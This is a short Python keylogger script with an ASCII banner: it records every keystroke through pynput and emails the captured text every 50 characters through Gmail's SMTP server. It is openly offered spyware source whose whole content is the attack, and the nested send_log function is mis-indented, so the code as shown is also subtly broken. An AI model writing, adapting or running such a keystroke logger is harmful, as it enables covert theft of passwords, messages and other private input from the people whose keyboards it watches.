import getpass
import smtplib
from pynput.keyboard import Key, Listener

print('''
      ___           ___                                              ___           ___           ___           ___           ___     
     /__/|         /  /\          ___                               /  /\         /  /\         /  /\         /  /\         /  /\    
    |  |:|        /  /:/_        /__/|                             /  /::\       /  /:/_       /  /:/_       /  /:/_       /  /::\   
    |  |:|       /  /:/ /\      |  |:|             ___     ___    /  /:/\:\     /  /:/ /\     /  /:/ /\     /  /:/ /\     /  /:/\:\  
  __|  |:|      /  /:/ /:/_     |  |:|            /__/\   /  /\  /  /:/  \:\   /  /:/_/::\   /  /:/_/::\   /  /:/ /:/_   /  /:/~/:/  
 /__/\_|:|____ /__/:/ /:/ /\  __|__|:|            \  \:\ /  /:/ /__/:/ \__\:\ /__/:/__\/\:\ /__/:/__\/\:\ /__/:/ /:/ /\ /__/:/ /:/___
 \  \:\/:::::/ \  \:\/:/ /:/ /__/::::\             \  \:\  /:/  \  \:\ /  /:/ \  \:\ /~~/:/ \  \:\ /~~/:/ \  \:\/:/ /:/ \  \:\/:::::/
  \  \::/~~~~   \  \::/ /:/     ~\~~\:\             \  \:\/:/    \  \:\  /:/   \  \:\  /:/   \  \:\  /:/   \  \::/ /:/   \  \::/~~~~ 
   \  \:\        \  \:\/:/        \  \:\             \  \::/      \  \:\/:/     \  \:\/:/     \  \:\/:/     \  \:\/:/     \  \:\     
    \  \:\        \  \::/          \__\/              \__\/        \  \::/       \  \::/       \  \::/       \  \::/       \  \:\    
     \__\/         \__\/                                            \__\/         \__\/         \__\/         \__\/         \__\/    

'''
      )

# set up email

email = input('Email: ')
password = input('Password')
server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.login(email, password)

# Logger
full_log = ''
word = ''
# send an email every 50 characters 
email_char_limit = 50


def on_press(key):
    global word
    global full_log
    global email
    global email_char_limit
      
     def send_log():server.sendmail(
        email,
        email,
        full_log
    )

    # condition if user presses the enter key or spce bar
    if key == Key.space or key == Key.enter:
        word += ' '
        full_log += word
        word = ''
        if len(full_log) >= email_char_limit:
            send_log()
            full_log = ''
    elif key == Key.shift_l or key == Key.shift_r:
        return
    elif key == Key.backspace:
        word = word[:-1]
    else:
        char = f'{key}'
        char = char[1:-1]
        word += char

    if key == Key.esc:
        return False
      


with Listener(on_press=on_press) as listener:
    listener.join()



